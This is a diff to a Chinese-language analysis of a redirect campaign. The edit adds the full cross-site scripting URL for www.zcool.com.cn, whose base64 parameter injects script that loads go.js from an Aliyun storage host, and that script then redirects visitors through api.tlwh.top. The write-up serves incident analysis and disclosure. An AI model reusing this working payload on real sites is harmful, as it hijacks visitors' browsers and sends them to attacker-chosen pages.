@@ -59,7 +59,7 @@ http://r-p-s-have.oss-cn-shenzhen.aliyuncs.com/go.js
 
 看到这里应该都了然了~
 
-其实，该作者是利用www.zcool.com.cn的存储xss?(**这个zcool相关人员自己定位分析一下吧**)，然后请求了
+其实，该作者是利用www.zcool.com.cn的xss(**`http://www.zcool.com.cn/%05url.z52k7mbwq8?link=Ij4iPjxzdHlsZSBvbmxvYWQ9ImRvY3VtZW50LnRpdGxlPSfliqDovb3kuK0uLi4uJzt2YXIgcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNyYz0nLy9yLXAtcy1oYXZlLm9zcy1jbi1zaGVuemhlbi5hbGl5dW5jcy5jb20vZ28uanMnO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQocyk7Ij4qe3Zpc2liaWxpdHk6aGlkZGVufTwvc3R5bGU+Cg==&from=singlemessage&isappinstalled=0` 这里link参数base64decode一下就很清晰里**)，然后请求了
 
 http://r-p-s-have.oss-cn-shenzhen.aliyuncs.com/go.js 而这个go.js 继续利用ajax技术请求了http://api.tlwh.top/ceshi/jump.php ，如果ajax请求成功返回，我们的页面就会顺着返回的内容跳转过去。
 
